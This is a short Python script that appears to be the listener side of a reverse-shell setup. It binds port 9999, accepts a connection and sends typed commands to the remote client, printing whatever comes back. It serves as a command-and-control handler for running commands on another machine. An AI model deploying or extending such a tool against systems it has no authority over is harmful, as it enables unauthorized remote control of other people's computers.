import socket
import sys


#creating socket to connect to computer

def create_socket():
    try:
        global host
        global port
        global s
        host =""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

#binding the socket and listening for connection

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port: " + str(port))

        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) +"\n" "Retrying.......")
        bind_socket()


#Establishing connection

def socket_accept():
    conn,address = s.accept()
    print("Connection has been Established | " + "IP | " + address[0] + " Port |" + str(address[1]))
    send_commands(conn)
    conn.close()

#sending command
def send_commands(conn):
    while True:
        cmd = input()

        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_reponse = str(conn.recv(1024),"utf-8")
            print(client_reponse, end="")




def main():
    create_socket()
    bind_socket()
    socket_accept()

main()